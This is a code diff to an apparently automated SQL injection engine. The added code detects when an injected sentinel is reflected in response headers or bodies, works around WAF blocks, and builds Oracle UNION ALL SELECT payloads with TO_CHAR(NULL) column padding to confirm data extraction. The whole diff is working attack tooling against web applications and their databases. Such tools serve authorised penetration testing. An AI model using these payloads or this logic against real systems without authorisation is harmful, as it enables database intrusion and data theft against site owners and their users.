@@ -115424,8 +115424,14 @@ class TechniqueCascadeEngine:
                             and (_det_tech_uh_ipc == "UH"
                                  or _det_fmt_uh_ipc in ("header", "cookie", "json", "xml", "path", "bg"))
                             and _SENTINEL.encode() not in _sfp.body):
+                        # BUG-INLINE-PCV-HDR-SETCOOKIE-FIX: Use list(_raw.items()) on the
+                        # raw headers object — same as _sentinel_in_headers helper — so
+                        # duplicate Set-Cookie entries are not collapsed to a single value.
                         try:
-                            for _hk_ipc, _hv_ipc in (getattr(_sfp, 'headers', {}) or {}).items():
+                            _sfp_ipc_raw_hdrs = getattr(_sfp, 'headers', None) or {}
+                            _sfp_ipc_hdr_items = (list(_sfp_ipc_raw_hdrs.items())
+                                                   if hasattr(_sfp_ipc_raw_hdrs, 'items') else [])
+                            for _hk_ipc, _hv_ipc in _sfp_ipc_hdr_items:
                                 if _SENTINEL in str(_hv_ipc):
                                     _sfp_sentinel_hdr_ipc = _hk_ipc
                                     break
@@ -118775,12 +118781,114 @@ class TechniqueCascadeEngine:
                 _sfp, _, _, _ = await _pcv_send(_sfx_str)
                 # If string-context probe got blocked or didn't reflect, try numeric
                 if not _validate_response(_sfp, func_name="waf_block_check"): pass  # BUG-FIX-SYNTAX: continue→pass (not inside loop; fallthrough to numeric variant below)
-                if not (_sfp and not WAFBlockDiscriminator.is_waf_block(_sfp) and _sfp.body
-                        and _sentinel_val in _safe_decode_body(_sfp, encoding="utf-8", errors="replace", func_name="extraction")):
+                # BUG-UH-PROBE-INITIAL-HDR-FIX: For UH/non-body surfaces the sentinel appears
+                # in RESPONSE HEADERS, not the body.  The original body-only check always fails
+                # for UH → sends numeric probe → numeric body also empty → _sfp stays string-
+                # context → header check at ~line +80 sends ANOTHER numeric probe (3 total).
+                # Fix: before sending the numeric probe, check whether the string-context probe
+                # already has the sentinel in its RESPONSE HEADERS.  If found, skip the numeric
+                # probe entirely.  If not, also check the numeric probe's headers and select it
+                # when the sentinel is there — avoids the redundant third probe later.
+                _is_non_body_surf_sentinel = (
+                    tech == "UH" or data_fmt in ("header", "cookie", "json", "xml", "path", "bg")
+                )
+                _str_probe_hdr_hit = False
+                if (_is_non_body_surf_sentinel and _sfp and
+                        not WAFBlockDiscriminator.is_waf_block(_sfp)):
+                    try:
+                        _sph_raw = getattr(_sfp, 'headers', None) or {}
+                        for _sphk, _sphv in (list(_sph_raw.items())
+                                             if hasattr(_sph_raw, 'items') else []):
+                            if _sentinel_val in str(_sphv):
+                                _str_probe_hdr_hit = True
+                                break
+                    except Exception:
+                        pass
+                if not (_str_probe_hdr_hit or
+                        (_sfp and not WAFBlockDiscriminator.is_waf_block(_sfp) and _sfp.body
+                         and _sentinel_val in _safe_decode_body(_sfp, encoding="utf-8", errors="replace", func_name="extraction"))):
                     _sfp_num, _, _, _ = await _pcv_send(_sfx_num)
                     if _sfp_num and not WAFBlockDiscriminator.is_waf_block(_sfp_num) and _sfp_num.body:
                         if _sentinel_val in _safe_decode_body(_sfp_num, encoding="utf-8", errors='replace', func_name='extraction__sfp_num'):
                             _sfp = _sfp_num  # numeric context worked
+                    # BUG-UH-PROBE-SELECTION-HDR-FIX: Also select numeric probe when sentinel
+                    # is in its RESPONSE HEADERS for UH/non-body surfaces.  Without this,
+                    # the header scan below sends a THIRD probe unnecessarily.
+                    elif (_sfp_num and not WAFBlockDiscriminator.is_waf_block(_sfp_num)
+                          and _is_non_body_surf_sentinel):
+                        try:
+                            _nph_raw = getattr(_sfp_num, 'headers', None) or {}
+                            for _nphk, _nphv in (list(_nph_raw.items())
+                                                  if hasattr(_nph_raw, 'items') else []):
+                                if _sentinel_val in str(_nphv):
+                                    _sfp = _sfp_num  # numeric context has sentinel in headers
+                                    break
+                        except Exception:
+                            pass
+                # BUG-ORACLE-UH-TYPED-COL-SENTINEL-FIX: Oracle UNION SELECT requires all
+                # columns in the UNION to have compatible types.  When the target query
+                # returns typed columns (e.g. NUMBER), combining a VARCHAR2 sentinel with
+                # bare NULL may raise ORA-01790 "expression must have same datatype" — the
+                # sentinel is never reflected.  Try TO_CHAR(NULL) wrappers for Oracle nulls
+                # and also a TO_CHAR-wrapped sentinel to ensure VARCHAR2 type compatibility.
+                # Also try placing the sentinel in each column position (up to 4) since only
+                # the user-visible column reflects output for UNION techniques.
+                _sentinel_reflected_from_fallback = False
+                if (dbms == "Oracle" and _ncols >= 2 and
+                        not _str_probe_hdr_hit and
+                        not (_sfp and not WAFBlockDiscriminator.is_waf_block(_sfp) and _sfp.body
+                             and _sentinel_val in _safe_decode_body(_sfp, encoding="utf-8", errors="replace", func_name="extraction__ora_chk"))):
+                    # Check if sentinel is already in headers (from initial probes) — don't try fallbacks
+                    _sfp_hdr_already = None
+                    if _sfp and not WAFBlockDiscriminator.is_waf_block(_sfp):
+                        try:
+                            _sfp_hdr_already_raw = getattr(_sfp, 'headers', None) or {}
+                            for _ahk, _ahv in (list(_sfp_hdr_already_raw.items())
+                                               if hasattr(_sfp_hdr_already_raw, 'items') else []):
+                                if _sentinel_val in str(_ahv):
+                                    _sfp_hdr_already = _ahk
+                                    break
+                        except Exception:
+                            pass
+                    if not _sfp_hdr_already:
+                        # Build Oracle typed-null fallback probes: TO_CHAR(NULL) in all non-sentinel positions
+                        _ora_tc_nulls = ",".join(["TO_CHAR(NULL)"] * max(0, _ncols - 1))
+                        _ora_fallback_probes = []
+                        for _fci in range(min(_ncols, 4)):
+                            _fcols_tc = ["TO_CHAR(NULL)"] * _ncols
+                            _fcols_tc[_fci] = f"'{_sentinel_val}'"
+                            _ora_fallback_probes.extend([
+                                f"' UNION ALL SELECT {','.join(_fcols_tc)} FROM DUAL-- -",
+                                f" UNION ALL SELECT {','.join(_fcols_tc)} FROM DUAL-- -",
+                            ])
+                        for _ofp_pay in _ora_fallback_probes[:8]:  # cap at 8 probes
+                            try:
+                                _ofp_r, _, _, _ = await _pcv_send(_ofp_pay)
+                                if not _ofp_r or WAFBlockDiscriminator.is_waf_block(_ofp_r):
+                                    continue
+                                _ofp_body = _safe_decode_body(_ofp_r, encoding="utf-8", errors="replace",
+                                                              func_name="extraction__ora_fallback")
+                                if _sentinel_val in _ofp_body:
+                                    _sfp = _ofp_r
+                                    _sentinel_reflected_from_fallback = True
+                                    break
+                                # Also check headers for UH
+                                if _is_non_body_surf_sentinel:
+                                    _ofp_raw_h = getattr(_ofp_r, 'headers', None) or {}
+                                    for _ofhk, _ofhv in (list(_ofp_raw_h.items())
+                                                          if hasattr(_ofp_raw_h, 'items') else []):
+                                        if _sentinel_val in str(_ofhv):
+                                            _sfp = _ofp_r
+                                            _sentinel_reflected_from_fallback = True
+                                            break
+                                if _sentinel_reflected_from_fallback:
+                                    break
+                            except Exception:
+                                continue
+                        if _sentinel_reflected_from_fallback:
+                            LOG.debug(f"[PCV-SENTINEL] Oracle TO_CHAR fallback probe reflected sentinel "
+                                      f"'{_sentinel_val}' (typed-column UNION)")
+
                 # BUG-V225-UH-SENTINEL-HEADER-FIX: helper to fire sentinel confirmation
                 # (shared by body-found and header-found paths to avoid duplication).
                 async def _do_sentinel_confirm(_location_label):
